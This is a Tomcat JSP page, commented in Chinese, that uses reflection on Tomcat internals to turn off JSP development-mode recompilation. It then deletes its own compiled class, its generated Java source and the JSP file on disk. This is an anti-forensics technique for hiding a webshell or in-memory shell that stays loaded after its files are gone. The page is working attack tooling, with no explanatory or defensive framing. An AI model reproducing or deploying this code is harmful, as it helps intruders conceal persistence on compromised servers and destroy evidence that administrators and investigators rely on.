<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.mapper.MappingData" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="org.apache.jasper.EmbeddedServletOptions" %>
<%@ page import="org.apache.jasper.JspCompilationContext" %>
<%@ page import="java.io.File" %>
<%@ page import="org.apache.jasper.compiler.JspRuntimeContext" %>
<%@ page import="java.util.concurrent.ConcurrentHashMap" %>
<%@ page import="org.apache.jasper.servlet.JspServletWrapper" %>
<%
    //从request对象中获取request属性
    Field requestF = request.getClass().getDeclaredField("request");
    requestF.setAccessible(true);
    Request req = (Request) requestF.get(request);
    //获取MappingData
    MappingData mappingData = req.getMappingData();
    //获取Wrapper
    Field wrapperF = mappingData.getClass().getDeclaredField("wrapper");
    wrapperF.setAccessible(true);
    Wrapper wrapper = (Wrapper) wrapperF.get(mappingData);
    //获取jspServlet对象
    Field instanceF = wrapper.getClass().getDeclaredField("instance");
    instanceF.setAccessible(true);
    Servlet jspServlet = (Servlet) instanceF.get(wrapper);
    //获取options中保存的对象
    Field Option = jspServlet.getClass().getDeclaredField("options");
    Option.setAccessible(true);
    EmbeddedServletOptions op = (EmbeddedServletOptions) Option.get(jspServlet);
    //设置development属性为false
    Field Developent = op.getClass().getDeclaredField("development");
    Developent.setAccessible(true);
    Developent.set(op,false);

    //获取rctxt属性
    Field rctxt = jspServlet.getClass().getDeclaredField("rctxt");
    rctxt.setAccessible(true);
    JspRuntimeContext jspRuntimeContext = (JspRuntimeContext) rctxt.get(jspServlet);
    //获取jsps属性内容
    Field jspsF = jspRuntimeContext.getClass().getDeclaredField("jsps");
    jspsF.setAccessible(true);
    ConcurrentHashMap jsps = (ConcurrentHashMap) jspsF.get(jspRuntimeContext);
    //获取对应的JspServletWrapper
    JspServletWrapper jsw = (JspServletWrapper)jsps.get(request.getServletPath());
    //获取ctxt属性保存的JspCompilationContext对象
    Field ctxt = jsw.getClass().getDeclaredField("ctxt");
    ctxt.setAccessible(true);
    JspCompilationContext jspCompContext = (JspCompilationContext) ctxt.get(jsw);
    File targetFile;
    targetFile = new File(jspCompContext.getClassFileName());//删掉jsp的.class
    targetFile.delete();
    targetFile = new File(jspCompContext.getServletJavaFileName());//删掉jsp的java文件
    targetFile.delete();
    //删除JSP文件
    String __jspName = this.getClass().getSimpleName().replaceAll("_", ".");
    String path=application.getRealPath(__jspName);
    File file = new File(path);
    file.delete();
%>